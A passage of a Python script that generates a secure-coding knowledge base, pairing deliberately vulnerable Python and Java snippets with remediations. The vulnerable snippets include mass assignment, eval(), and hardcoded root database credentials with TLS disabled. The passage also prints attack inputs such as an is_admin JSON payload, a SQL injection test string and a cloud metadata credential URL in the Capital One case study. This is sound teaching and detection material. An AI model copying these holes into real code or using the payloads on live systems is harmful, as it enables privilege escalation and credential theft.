    <version>[2.0,)</version> <!-- Unbounded upper range might pull vulnerable version! -->
</dependency>""",
        "java_sec": """<!-- SECURE: Explicitly pinned patched version in Maven pom.xml -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.23.1</version> <!-- Pinned patched version immune to Log4Shell -->
</dependency>""",
        "heuristics": [
            "Scan requirements.txt or pom.xml for floating version ranges (>=, *, LATEST).",
            "Verify that CI/CD workflows execute automated dependency audit tools (pip-audit, safety).",
            "Check for presence of unpinned dependencies in Dockerfiles (e.g., pip install flask without version).",
            "Flag known high-risk packages with historical RCE vulnerabilities if versions match vulnerable ranges."
        ]
    },
    {
        "id": 19,
        "title": "API Security",
        "cwe": "CWE-284 (Improper Access Control in API Endpoints)",
        "owasp": "OWASP API Security Top 10 (API1:2023 through API10:2023)",
        "concepts": [
            "Application Programming Interfaces (APIs) expose application logic and sensitive data directly to client applications.",
            "API1 Broken Object Level Authorization (BOLA) remains the #1 API risk: manipulating IDs in REST URLs.",
            "API2 Broken Authentication involves weak token validation, JWT signature flaws, and missing rate limiting.",
            "API3 Broken Object Property Level Authorization encompasses Mass Assignment and Excessive Data Exposure.",
            "Mass Assignment occurs when client JSON payloads are bound directly to database entities, overwriting privileged properties.",
            "Excessive Data Exposure occurs when APIs return complete entity models, relying on client frontends to filter fields.",
            "API4 Unrestricted Resource Consumption highlights the lack of request rate limiting and payload size limits.",
            "API5 Broken Function Level Authorization occurs when standard users invoke administrative API endpoints.",
            "Data Transfer Objects (DTOs) with explicit field mappings prevent mass assignment vulnerabilities.",
            "API gateways should enforce centralized token authentication, rate limiting, and schema validation."
        ],
        "threat_model": [
            "Threat Actors: Malicious API clients, automated scraping bots, mobile application reverse-engineers.",
            "Attacker Goals: Elevating account privileges, scraping proprietary databases, executing credential stuffing attacks.",
            "Attack Vectors: Sending PUT /api/user with {\"is_admin\": true}, crawling /api/v1/users/1...100000 without rate limits."
        ],
        "py_vuln": """# VULNERABLE: Mass assignment binding raw request JSON directly to database model
from flask import Flask, request, jsonify
from flask_login import current_user, login_required

@app.route("/api/user/profile", methods=["PUT"])
@login_required
def update_profile():
    # Attacker payload: {"display_name": "Bob", "is_admin": True, "balance": 99999}
    data = request.get_json()
    for key, value in data.items():
        setattr(current_user, key, value)  # Overwrites sensitive attributes!
    db.session.commit()
    return jsonify({"status": "updated"})""",
        "py_sec": """# SECURE: Explicit field mapping using validated Pydantic DTO
from flask import Flask, request, jsonify
from flask_login import current_user, login_required
from pydantic import BaseModel, Field

class ProfileUpdateDTO(BaseModel):
    display_name: str = Field(..., max_length=50)
    bio: str = Field(default="", max_length=200)

@app.route("/api/user/profile_secure", methods=["PUT"])
@login_required
def update_profile_secure():
    dto = ProfileUpdateDTO(**request.get_json())
    # Explicit mapping guarantees protected fields (is_admin, balance) cannot be overwritten
    current_user.display_name = dto.display_name
    current_user.bio = dto.bio
    db.session.commit()
    return jsonify({"status": "updated", "display_name": current_user.display_name})""",
        "java_vuln": """// VULNERABLE: Spring Boot binding request body directly to JPA Entity
@RestController
@RequestMapping("/api/users")
public class UserController {
    @PutMapping("/profile")
    public User updateProfile(@RequestBody User user) {
        // Automatically maps JSON properties into JPA User entity, including admin flags!
        return userRepository.save(user);
    }
}""",
        "java_sec": """// SECURE: Mapping from dedicated DTO to Entity in Spring Boot
@RestController
@RequestMapping("/api/users")
public class SecureUserController {
    @PutMapping("/profile")
    public ResponseEntity<UserDTO> updateProfile(@Valid @RequestBody ProfileUpdateDTO dto, @AuthenticationPrincipal User current) {
        current.setDisplayName(dto.getDisplayName());
        current.setBio(dto.getBio());
        userRepository.save(current);
        return ResponseEntity.ok(new UserDTO(current));
    }
}""",
        "heuristics": [
            "Flag dynamic loops iterating over request.json items calling setattr() or updating database entities directly.",
            "Verify that API endpoints apply rate-limiting decorators or middleware (e.g., @limiter.limit).",
            "Identify route handlers that serialize and return internal User or Account models without masking fields.",
            "Check for HTTP method tampering where POST, PUT, DELETE routes fail to enforce authentication."
        ]
    },
    {
        "id": 20,
        "title": "Secure Database Access",
        "cwe": "CWE-250 (Execution with Unnecessary Privileges)",
        "owasp": "A01:2021 - Broken Access Control and A05:2021 - Security Misconfiguration",
        "concepts": [
            "Databases house an organization's most sensitive information assets, requiring defense-in-depth protections.",
            "Application database connection pools must operate under the Principle of Least Privilege.",
            "Web application users should never connect to databases using superuser accounts (sa, postgres, root).",
            "Separate database accounts must be used for routine transactional operations (CRUD) versus schema migrations (DDL).",
            "Database connections must enforce TLS encryption in transit (sslmode=verify-full) to prevent sniffing.",
            "Sensitive table columns (credit cards, PII, encryption keys) must be encrypted at rest using AES-256.",
            "Connection pools must enforce maximum active connection caps and connection timeouts to prevent resource exhaustion.",
            "Database servers must reside in isolated private subnets, inaccessible directly from the public internet.",
            "Row-Level Security (RLS) policies in PostgreSQL provide defense-in-depth by enforcing tenant data segregation in the DB engine.",
            "Database audit logging should record administrative schema alterations, bulk export queries, and failed login attempts."
        ],
        "threat_model": [
            "Threat Actors: Compromised application servers, malicious database administrators, network eavesdroppers.",
            "Attacker Goals: Bulk database exfiltration, dropping database tables, injecting persistent stored database triggers.",
            "Attack Vectors: Exploiting application-level SQLi to execute administrative commands via over-privileged database credentials."
        ],
        "py_vuln": """# VULNERABLE: Connecting as database superuser without connection management or TLS
import psycopg2

def get_insecure_db_connection():
    # Over-privileged superuser account; cleartext unencrypted connection
    return psycopg2.connect(
        "dbname=prod user=postgres password=rootpass host=db.internal sslmode=disable"
    )""",
        "py_sec": """# SECURE: Least-privilege account, TLS verification, and context management
import psycopg2
from contextlib import contextmanager
import os

@contextmanager
def get_secure_db_cursor():
    # Dedicated least-privilege service account enforcing TLS verification
    conn = psycopg2.connect(
        dbname=os.environ["DB_NAME"],
        user=os.environ["DB_APP_USER"],
        password=os.environ["DB_APP_PASSWORD"],
        host=os.environ["DB_HOST"],
        sslmode="verify-full",
        sslrootcert="/etc/ssl/certs/db-ca-cert.pem"
    )
    cursor = conn.cursor()
    try:
        yield cursor
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        cursor.close()
        conn.close()""",
        "java_vuln": """// VULNERABLE: Hardcoded root credentials in JDBC configuration
DriverManager.getConnection("jdbc:mysql://localhost:3306/prod?useSSL=false", "root", "root");""",
        "java_sec": """// SECURE: HikariCP connection pool with TLS and restricted application user
HikariConfig config = new HikariConfig();
config.setJdbcUrl("jdbc:postgresql://db.internal:5432/prod?sslmode=verify-full&sslrootcert=/certs/ca.crt");
config.setUsername(System.getenv("DB_APP_USER"));
config.setPassword(System.getenv("DB_APP_PASSWORD"));
config.setMaximumPoolSize(15);
config.setConnectionTimeout(10000); // 10 seconds
HikariDataSource ds = new HikariDataSource(config);""",
        "heuristics": [
            "Scan database connection strings for user=root, user=sa, or user=postgres.",
            "Flag database URLs containing sslmode=disable or useSSL=false.",
            "Verify that database connections utilize context managers or connection pools to avoid leaks.",
            "Check that database credentials are read from environment variables rather than hardcoded strings."
        ]
    },
    {
        "id": 21,
        "title": "Code Smells and Maintainability",
        "cwe": "CWE-1078 (Weakness in Software Architecture or Design)",
        "owasp": "A04:2021 - Insecure Design",
        "concepts": [
            "Code smells are structural or stylistic design flaws that do not represent active vulnerabilities by themselves.",
            "Obfuscated, overly complex code significantly increases the probability of introducing severe security defects.",
            "Excessive Cyclomatic Complexity makes auditing control flow and security guard branches nearly impossible.",
            "Long Functions (exceeding 40 lines) frequently violate the Single Responsibility Principle, mixing logic with validation.",
            "Deeply nested conditional blocks obscure boundary conditions and error handling paths.",
            "Unused imports and dead code create noise during audits and expand the potential gadget attack surface.",
            "Poor naming conventions (single-character variables like a, p, x) obscure data sensitivity and origin.",
            "Duplicate code blocks force security patches to be applied in multiple places, leading to inconsistent fixes.",
            "Refactoring complex procedures into small, single-purpose functions with descriptive names improves auditability.",
            "Static analysis metrics like Cyclomatic Complexity (<= 10) and Function Length (<= 35 lines) guide clean refactoring."
        ],
        "threat_model": [
            "Threat Actors: Subtle bugs, software regressions, missed security vulnerabilities during peer review.",
            "Attacker Goals: Finding overlooked edge cases in deeply nested conditional branches to bypass authorization.",
            "Attack Vectors: Crafting edge-case inputs that navigate through labyrinthine logic trees without triggering access checks."
        ],
        "py_vuln": """# VULNERABLE CODE SMELL: High complexity, deep nesting, poor naming
def p(d, u, f):
    if d is not None:
        if u is not None:
            if "role" in u:
                if u["role"] == "admin":
                    if f:
                        if "amount" in d:
                            if d["amount"] > 1000:
                                return True
    return False""",
        "py_sec": """# SECURE REFACTORING: Guard clauses, clear naming, and low complexity
def is_high_value_admin_transaction(transaction: dict, user: dict, is_flagged: bool) -> bool:
    if not transaction or not user:
        return False
    if user.get("role") != "admin":
        return False
    if not is_flagged:
        return False
    return transaction.get("amount", 0) > 1000""",
        "java_vuln": """// VULNERABLE CODE SMELL: God Method with excessive length and parameter count
public void process(String a, String b, int c, double d, boolean e, String f, String g) {
    // 150 lines of mixed validation, SQL execution, HTML formatting, and file writes
}""",
        "java_sec": """// SECURE REFACTORING: Small modular methods and parameter object pattern
public class TransactionProcessor {
    public void processTransaction(TransactionContext context) {
        validateTransactionContext(context);
        persistTransactionRecord(context);
        dispatchNotification(context);
    }
}""",
        "heuristics": [
            "Flag functions exceeding 35 physical source lines.",
            "Compute cyclomatic complexity based on branch statements (if, for, while, and, or); warn if > 10.",
            "Detect unused imports by comparing import names against Abstract Syntax Tree Name nodes.",
            "Identify single-letter variable names outside of standard loop counters."
        ]
    },
    {
        "id": 22,
        "title": "Security Testing and Code Review",
        "cwe": "CWE-1004 (Vulnerability Assessment and Verification)",
        "owasp": "SDLC Security Verification",
        "concepts": [
            "Application security assurance requires combining automated testing tools with rigorous manual code reviews.",
            "Static Application Security Testing (SAST) inspects source code or bytecode without executing the application.",
            "SAST provides 100% code coverage, pinpoints exact source file lines, and catches flaws early in development.",
            "Dynamic Application Security Testing (DAST) tests running applications externally via black-box HTTP probing.",
            "DAST identifies runtime deployment flaws and environment misconfigurations without generating source-code false positives.",
            "Interactive Application Security Testing (IAST) deploys agent sensors inside application runtimes during automated QA tests.",
            "Software Composition Analysis (SCA) continuously inventories third-party libraries and scans against CVE registries.",
            "Threat-driven peer code reviews focus specifically on data ingress points, privilege boundaries, and cryptographic routines.",
            "Security Champions embedded in engineering squads guide security best practices and triage SAST alerts.",
            "Automated quality gates in CI/CD pipelines should automatically block pull requests introducing High or Critical flaws."
        ],
        "threat_model": [
            "Threat Actors: Software flaws escaping into production environments due to absent security testing.",
            "Attacker Goals: Discovering unpatched vulnerabilities before the engineering organization is aware of them.",
            "Attack Vectors: Scanning newly released application versions for vulnerabilities introduced during recent refactoring."
        ],
        "py_vuln": """# INADEQUATE TESTING: Testing only happy path and omitting negative security tests
def test_transfer_happy_path():
    result = transfer_funds("account_a", "account_b", 50)
    assert result == "Success" """,
        "py_sec": """# COMPREHENSIVE SECURITY TEST SUITE: Testing boundary conditions and attack payloads
import pytest

def test_transfer_negative_amount_raises_error():
    with pytest.raises(ValueError, match="Amount must be positive"):
        transfer_funds("account_a", "account_b", -100)

def test_transfer_sqli_payload_rejected():
    with pytest.raises(ValueError):
        transfer_funds("account_a' OR '1'='1", "account_b", 50)

def test_transfer_unauthorized_user_denied():
    with pytest.raises(PermissionError):
        transfer_funds_as_user(unauthorized_user, "account_a", "account_b", 50)""",
        "java_vuln": """// INADEQUATE TEST: Missing authorization and boundary validation tests
@Test
public void testGetAccount() {
    Account acc = accountService.getAccount(1L);
    assertNotNull(acc);
}""",
        "java_sec": """// COMPREHENSIVE TEST: Enforcing security context and access control verification
@Test
@WithMockUser(username = "bob", roles = {"USER"})
public void testGetAccountUnauthorizedAccessThrowsSecurityException() {
    // Verifies that Bob cannot access Alice's account (IDOR defense verification)
    assertThrows(AccessDeniedException.class, () -> {
        accountService.getAccountForUser(2L); // Account belonging to Alice
    });
}""",
        "heuristics": [
            "Verify that test suites include negative test cases asserting security exceptions on invalid inputs.",
            "Check that security tests evaluate boundary conditions (negative numbers, empty strings, oversized payloads).",
            "Ensure automated security scanners run on every pull request prior to merge approval.",
            "Verify that test fixtures and mock data do not contain actual production credentials."
        ]
    },
    {
        "id": 23,
        "title": "Vulnerability Severity and Prioritization",
        "cwe": "CWE-1000 (Research Concepts in Vulnerability Prioritization)",
        "owasp": "Vulnerability Risk Management",
        "concepts": [
            "Security vulnerability prioritization ensures engineering teams remediate the most hazardous risks first.",
            "The Common Vulnerability Scoring System (CVSS v3.1 / v4.0) provides a standardized framework for rating severity.",
            "CVSS Base Metrics evaluate Attack Vector (Network/Local), Attack Complexity (Low/High), and Privileges Required.",
            "CVSS also evaluates User Interaction requirements, Scope changes, and Impact on Confidentiality, Integrity, and Availability.",
            "Critical Severity (CVSS 9.0 - 10.0): Remotely exploitable without credentials, resulting in total compromise (RCE, SQLi).",
            "High Severity (CVSS 7.0 - 8.9): Significant compromise requiring limited privileges or user interaction (Stored XSS).",
            "Medium Severity (CVSS 4.0 - 6.9): Harder to exploit or limited damage (Reflected XSS, CSRF, verbose error messages).",
            "Low Severity (CVSS 0.1 - 3.9): Minor defense-in-depth deviations (missing security headers, weak cookie flags).",
            "Service Level Agreements (SLAs) dictate remediation timelines: Critical (< 24h), High (< 7d), Medium (< 30d).",
            "Contextual risk adjustments factor in environmental exposure (public-facing vs. air-gapped internal systems)."
        ],
        "threat_model": [
            "Threat Actors: Attackers exploiting publicly known, unpatched vulnerabilities during remediation delays.",
            "Attacker Goals: Exploiting known vulnerabilities before security teams can deploy scheduled patches.",
            "Attack Vectors: Scanning for published CVEs and executing weaponized exploit scripts against unpatched targets."
        ],
        "py_vuln": """# FLAWED PRIORITIZATION: Treating all static analysis findings with equal weight
def handle_findings_bad(findings: list):
    # Treating a missing comment with the same urgency as Remote Code Execution!
    for f in findings:
        print(f"Issue found: {f['name']}")""",
        "py_sec": """# ACCURATE PRIORITIZATION: Stratifying remediation by CVSS score and SLA
def categorize_and_enforce_sla(findings: list):
    severity_sla = {
        "Critical": "24 hours (Urgent P0 Hotline)",
        "High": "7 days (Sprint blocker)",
        "Medium": "30 days (Regular backlog)",
        "Low": "90 days (Hygiene review)"
    }
    categorized = {"Critical": [], "High": [], "Medium": [], "Low": []}
    for f in findings:
        sev = f.get("severity", "Low")
        categorized.setdefault(sev, []).append(f)

    for sev, items in categorized.items():
        if items:
            print(f"[{sev.upper()}] {len(items)} issues detected. SLA: {severity_sla[sev]}")
    return categorized""",
        "java_vuln": """// FLAWED: Lack of severity routing in security handler
public void alertSecurityTeam(List<Finding> findings) {
    findings.forEach(f -> emailHelpdesk(f.getTitle())); // Sends hundreds of low-priority alerts
}""",
        "java_sec": """// SECURE: Automated triage routing based on severity thresholds
public void alertSecurityTeamSecure(List<Finding> findings) {
    for (Finding f : findings) {
        if (f.getSeverity() == Severity.CRITICAL) {
            triggerPagerDutyIncident(f); // PagerDuty wake-up call for Critical RCE/SQLi
        } else if (f.getSeverity() == Severity.HIGH) {
            createJiraTicket(f, Priority.HIGH);
        } else {
            logFinding(f);
        }
    }
}""",
        "heuristics": [
            "Ensure static analysis agents assign normalized severity levels (Critical, High, Medium, Low).",
            "Verify that build break gates trigger exclusively on Critical and High severity findings.",
            "Include CVSS vector strings and CWE identifiers in all generated findings.",
            "Display severity distribution charts on dashboards to guide developer remediation focus."
        ]
    },
    {
        "id": 24,
        "title": "Secure Remediation Examples",
        "cwe": "CWE-657 (Violation of Secure Design Principles)",
        "owasp": "Remediation Catalog",
        "concepts": [
            "Providing concrete, side-by-side secure remediation code is essential for developer education and rapid bug resolution.",
            "Remediation must address root architectural causes rather than applying fragile superficial input patches.",
            "For SQL Injection: Replace dynamic string formatting with parameterized prepared statements.",
            "For Command Injection: Replace shell=True and os.system with discrete argument lists in subprocess.run(shell=False).",
            "For Insecure Deserialization: Replace pickle and ObjectInputStream with JSON or Protocol Buffers.",
            "For Weak Cryptography: Replace MD5 and SHA-1 with PBKDF2/scrypt for passwords and SHA-256 for data integrity.",
            "For Insecure Randomness: Replace random and java.util.Random with secrets and java.security.SecureRandom.",
            "For Path Traversal: Resolve canonical paths with Path.resolve() and verify directory boundary containment.",
            "For Hardcoded Secrets: Extract credentials into environment variables injected via .env or vault services.",
            "Remediations generated by automated review agents must always be labeled as recommendations requiring human verification."
        ],
        "threat_model": [
            "Threat Actors: Adversaries searching for half-patched vulnerabilities and bypasses to naive sanitizer routines.",
            "Attacker Goals: Bypassing superficial fixes to re-exploit underlying structural vulnerabilities.",
            "Attack Vectors: Crafting payloads with alternative character encodings that bypass blacklist string replacements."
        ],
        "py_vuln": """# VULNERABLE: Direct eval calculation
def compute(expr):
    return eval(expr)""",
        "py_sec": """# SECURE: Safe AST literal evaluation
import ast

def compute_secure(expr):
    # Safely parses strings containing Python literals (numbers, tuples, lists, dicts)
    return ast.literal_eval(expr)""",
        "java_vuln": """// VULNERABLE: Cleartext cookie creation
Cookie c = new Cookie("auth", token);
response.addCookie(c);""",
        "java_sec": """// SECURE: Hardened cookie flags
Cookie c = new Cookie("auth", token);
c.setHttpOnly(true);  // Blocks JavaScript XSS reading
c.setSecure(true);    // Transmitted over HTTPS only
c.setPath("/");
response.addCookie(c);""",
        "heuristics": [
            "Verify that remediation suggestions provide drop-in replacement code snippets.",
            "Ensure remediation explanations articulate why the original code was dangerous and why the fix is safer.",
            "Label all automated fix recommendations as requiring human code review prior to production deployment.",
            "Confirm that the suggested remediation does not introduce new compiler warnings or syntax errors."
        ]
    },
    {
        "id": 25,
        "title": "Common False Positives and Limitations of Static Analysis",
        "cwe": "CWE-1007 (Architectural Weakness in Static Verification Systems)",
        "owasp": "SAST Heuristic Limitations",
        "concepts": [
            "By Rice's Theorem, any non-trivial semantic property of a universal computer program is theoretically undecidable.",
            "Static analysis inspects code structure and Abstract Syntax Trees without running code with actual runtime data.",
            "Consequently, static analyzers can never achieve 100% precision and 100% recall simultaneously.",
            "False Positives occur when safe code is flagged as vulnerable due to lack of runtime execution context.",
            "Common false positive: Mock test credentials (e.g., test_password = 'secret123') in unit test files.",
            "Common false positive: Variable names containing sensitive keywords (e.g., is_password_reset_allowed = True).",
            "Common false positive: Input parameters that were already sanitized upstream by an API gateway or framework middleware.",
            "False Negatives occur when real vulnerabilities escape detection due to dynamic metaprogramming or complex reflection.",
            "Static analysis agents must clearly distinguish verified pattern matches from heuristic warnings.",
            "Developer suppression mechanisms (e.g., # noqa: SEC-01) allow teams to document and silence verified false positives."
        ],
        "threat_model": [
            "Threat Actors: Alert fatigue causing developers to ignore real critical security alerts among false positives.",
            "Attacker Goals: Exploiting real vulnerabilities that developers dismissed as false positives.",
            "Attack Vectors: Hiding exploits in code constructs known to cause static analysis blind spots (dynamic reflection)."
        ],
        "py_vuln": """# FALSE POSITIVE EXAMPLE: Test mock variable flagged as hardcoded production secret
def test_authentication_service():
    # Static scanners without test-context awareness flag this as a hardcoded credential
    dummy_api_key = "test_mock_token_12345"
    assert verify_token(dummy_api_key) is True""",
        "py_sec": """# SECURE TRIAGE: Inline suppression annotation with documented reasoning
def test_authentication_service_triaged():
    # Static review engines recognize suppression comments with documented justification
    dummy_api_key = "test_mock_token_12345"  # noqa: SEC-CRED-01 - Mock test token only
    assert verify_token(dummy_api_key) is True""",
        "java_vuln": """// FALSE POSITIVE EXAMPLE: Safe constant string concatenation flagged as SQL injection
public List<User> getActiveUsers(Connection conn) throws SQLException {
    String table = "users";
    String sql = "SELECT * FROM " + table + " WHERE is_active = 1"; // Hardcoded constants only!
    return conn.createStatement().executeQuery(sql);
}""",
        "java_sec": """// SECURE TRIAGE: Refactored to eliminate ambiguity or annotated with suppression
@SuppressWarnings("Security") // Verified false positive: concatenation involves only constant literals
public List<User> getActiveUsersSecure(Connection conn) throws SQLException {
    final String sql = "SELECT * FROM users WHERE is_active = 1";
    return conn.createStatement().executeQuery(sql);
}""",
        "heuristics": [
            "Check whether findings occur within test directories (tests/, test/) and reduce severity accordingly.",
            "Support inline suppression directives (# noqa: RULE_ID or # nosec) with mandatory justification comments.",
            "Clearly label all static findings as heuristic recommendations requiring developer validation.",
            "Periodically audit suppressed findings to prevent developers from silencing legitimate security defects."
        ]
    }
]

def generate_file(output_path: Path):
    lines = []

    lines.append("# Comprehensive Secure Coding and Software Assurance Knowledge Base")
    lines.append("")
    lines.append("## Professional Engineering Reference Manual")
    lines.append("- **Domain**: Application Security, Static Code Analysis, and Secure Software Development Lifecycle (SSDLC)")
    lines.append("- **Primary Target Audience**: Senior Software Engineers, Security Auditors, College Project Reviewers, and AI Code Review Agents")
    lines.append("- **Languages Covered**: Python 3.x and Enterprise Java (Java 8 - 21)")
    lines.append("- **Primary Standards**: OWASP Top 10 (2021 & 2025 drafts), CWE/SANS Top 25 Most Dangerous Software Weaknesses, NIST SP 800-53, SEI CERT Coding Standards")
    lines.append("- **Operational Scope**: Static Analysis Heuristics, Pattern Rules, False-Positive Mitigation, and Concrete Code Remediation")
    lines.append("")
    lines.append("---")
    lines.append("")

    for item in TOPICS:
        lines.append(f"## {item['id']}. {item['title']}")
        lines.append("")
        lines.append(f"**Primary CWE Mapping**: {item['cwe']}")
        lines.append(f"**OWASP Category Alignment**: {item['owasp']}")
        lines.append("")
        lines.append(f"### {item['id']}.1 Conceptual Foundations and Risk Analysis")
        for concept in item["concepts"]:
            lines.append(f"- {concept}")
        lines.append("")
        lines.append(f"### {item['id']}.2 Threat Model and Attack Vectors")
        for tm in item["threat_model"]:
            lines.append(f"- {tm}")
        lines.append("")
        lines.append(f"### {item['id']}.3 Vulnerable Python Implementation")
        lines.append("```python")
        for code_line in item["py_vuln"].split("\n"):
            lines.append(code_line)
        lines.append("```")
        lines.append("")
        lines.append(f"### {item['id']}.4 Secure Remediated Python Implementation")
        lines.append("```python")
        for code_line in item["py_sec"].split("\n"):
            lines.append(code_line)
        lines.append("```")
        lines.append("")
        lines.append(f"### {item['id']}.5 Vulnerable Java Implementation")
        lines.append("```java")
        for code_line in item["java_vuln"].split("\n"):
            lines.append(code_line)
        lines.append("```")
        lines.append("")
        lines.append(f"### {item['id']}.6 Secure Remediated Java Implementation")
        lines.append("```java")
        for code_line in item["java_sec"].split("\n"):
            lines.append(code_line)
        lines.append("```")
        lines.append("")
        lines.append(f"### {item['id']}.7 Static Code Analysis Heuristics and Review Rules")
        for h in item["heuristics"]:
            lines.append(f"1. {h}")
        lines.append("")
        lines.append("---")
        lines.append("")

    # Comprehensive Appendix
    lines.append("## Appendix A: Authoritative Threat Modeling and Taxonomy Matrix")
    lines.append("")
    lines.append("| Rule ID | Vulnerability Title | Severity | CWE Mapping | OWASP Alignment | Recommended Mitigation Pattern |")
    lines.append("|---|---|---|---|---|---|")
    lines.append("| SEC-SQL-01 | SQL Injection in String Query | Critical | CWE-89 | A03:2021 Injection | Use parameterized bind markers (?) |")
    lines.append("| SEC-CMD-01 | Command Injection in Subshell | Critical | CWE-78 | A03:2021 Injection | Use subprocess.run with argument list & shell=False |")
    lines.append("| SEC-EVAL-01 | Dynamic Code Evaluation (eval/exec) | Critical | CWE-95 | A03:2021 Injection | Use ast.literal_eval or dedicated grammar parser |")
    lines.append("| SEC-DESER-01 | Unsafe Deserialization (pickle/Java) | Critical | CWE-502 | A08:2021 Integrity | Migrate to JSON or enforce strict ObjectInputFilter |")
    lines.append("| SEC-KEY-01 | Hardcoded Secret or Private Token | High | CWE-798 | A07:2021 Auth | Load from environment variables via .env / Vault |")
    lines.append("| SEC-PATH-01 | Path Traversal / Arbitrary File Read | High | CWE-22 | A01:2021 Access Control | Canonicalize with Path.resolve() & check boundary |")
    lines.append("| SEC-XSS-01 | Cross-Site Scripting (Reflected/Stored) | High | CWE-79 | A03:2021 Injection | Contextual HTML entity escaping & Jinja2 autoescape |")
    lines.append("| SEC-HASH-01 | Broken Cryptographic Hash (MD5/SHA1) | Medium | CWE-328 | A02:2021 Crypto | Use scrypt / PBKDF2 for passwords; SHA-256 for data |")
    lines.append("| SEC-RAND-01 | Predictable PRNG for Security Token | Medium | CWE-338 | A02:2021 Crypto | Replace random module with secrets CSPRNG |")
    lines.append("| SEC-ERR-01 | Verbose Stack Trace Disclosure | Low | CWE-209 | A05:2021 Misconfig | Return generic error message with tracking incident ID |")
    lines.append("| QUAL-LEN-01 | Monolithic Function (Length > 35) | Low | Code Smell | Clean Architecture | Extract smaller cohesive single-purpose functions |")
    lines.append("| QUAL-COMP-01 | High Cyclomatic Complexity (> 10) | Low | Code Smell | Clean Architecture | Refactor deep nesting into guard clauses |")
    lines.append("| QUAL-IMP-01 | Unused Module Import | Low | Code Smell | Clean Architecture | Remove unreferenced import declarations |")
    lines.append("")
    lines.append("## Appendix B: Step-by-Step Code Review Walkthrough for Students")
    lines.append("")
    lines.append("### B.1 Ingress Analysis and Source Identification")
    lines.append("1. Locate all external entry points: Flask route handlers (`@app.route`), Spring `@RestController` methods, Servlet `doGet`/`doPost` endpoints.")
    lines.append("2. Trace all incoming parameters: `request.args`, `request.form`, `request.json`, `request.cookies`, `request.headers`, `@RequestParam`, `@RequestBody`.")
    lines.append("3. Verify whether inputs undergo schema validation (Pydantic, Bean Validation) before passing into business logic.")
    lines.append("")
    lines.append("### B.2 Taint Propagation Tracking to Sinks")
    lines.append("1. Trace variable data flows from entry parameters to sensitive execution sinks.")
    lines.append("2. Database Sinks: `cursor.execute()`, `statement.executeQuery()`, ORM `session.execute()`.")
    lines.append("3. System Sinks: `os.system()`, `subprocess.Popen()`, `Runtime.getRuntime().exec()`, `ProcessBuilder`.")
    lines.append("4. Filesystem Sinks: `open()`, `send_file()`, `new File()`, `FileInputStream`.")
    lines.append("5. Response Sinks: `render_template_string()`, `out.println()`, `element.innerHTML`.")
    lines.append("6. Evaluation Sinks: `eval()`, `exec()`, `pickle.loads()`, `ObjectInputStream.readObject()`.")
    lines.append("")
    lines.append("### B.3 Verification of Defensive Controls")
    lines.append("1. Ensure that between every source and sink, an appropriate sanitization or parameter binding mechanism is in place.")
    lines.append("2. Verify that authentication and authorization checks precede resource lookups.")
    lines.append("3. Confirm that error handling fails securely without leaking diagnostic stack traces to callers.")
    lines.append("4. Verify that all cryptographic operations use modern algorithms, unique salts, and CSPRNG nonces.")
    lines.append("")
    lines.append("## Appendix C: Real-World Case Studies and Historical Vulnerabilities")
    lines.append("")
    lines.append("### C.1 Apache Struts Jakarta Multipart Parser (CVE-2017-5638)")
    lines.append("- **Root Cause**: Apache Struts failed to properly handle invalid Content-Type HTTP headers when processing file uploads, passing header values directly into an OGNL (Object-Graph Navigation Language) expression parser.")
    lines.append("- **Exploitation**: Remote attackers passed crafted OGNL expressions inside Content-Type headers, triggering unauthenticated remote command execution as the web application user.")
    lines.append("- **Consequences**: Led to the 2017 Equifax data breach, exposing personal and credit records of over 147 million consumers.")
    lines.append("- **Lesson**: Never evaluate untrusted HTTP header strings within expression interpreters; deploy automated dependency tracking to patch known CVEs within 24 hours.")
    lines.append("")
    lines.append("### C.2 Apache Log4j JNDI Lookup Vulnerability - Log4Shell (CVE-2021-44228)")
    lines.append("- **Root Cause**: Log4j 2.x included a message lookup substitution mechanism that evaluated `${jndi:ldap://...}` tags embedded in logged text messages.")
    lines.append("- **Exploitation**: An attacker sending an exploit payload in any logged field (such as HTTP User-Agent, form input, or error query) caused the server to connect to an attacker-controlled LDAP server, download serialized Java bytecode, and execute it.")
    lines.append("- **Consequences**: Affected hundreds of thousands of enterprise applications worldwide; rated CVSS 10.0 Maximum Critical.")
    lines.append("- **Lesson**: Avoid recursive or dynamic string interpolations in logging frameworks; disable remote JVM class loading.")
    lines.append("")
    lines.append("### C.3 Capital One AWS SSRF Breach (2019)")
    lines.append("- **Root Cause**: An open-source Web Application Firewall (ModSecurity) running on an AWS EC2 instance was misconfigured, allowing attackers to coerce the proxy into sending server-side requests to internal endpoints.")
    lines.append("- **Exploitation**: The attacker requested `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, obtaining temporary AWS IAM role access tokens, and subsequently synchronized private S3 storage buckets.")
    lines.append("- **Consequences**: Exfiltration of over 100 million customer credit applications and personal records.")
    lines.append("- **Lesson**: Require AWS IMDSv2 (session token authentication), restrict outbound proxy egress, and enforce least-privilege IAM roles.")
    lines.append("")

    full_text = "\n".join(lines) + "\n"
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(full_text)
    print(f"[Full KB Generator] Successfully wrote knowledge base to {output_path}")

if __name__ == "__main__":
    target = Path("C:/Users/Lakshmi/.gemini/antigravity/scratch/AI_Code_Review_Security_Agent/knowledge_base/secure_coding_knowledge_base.md")
    if len(sys.argv) > 1:
        target = Path(sys.argv[1]).resolve()
    generate_file(target)
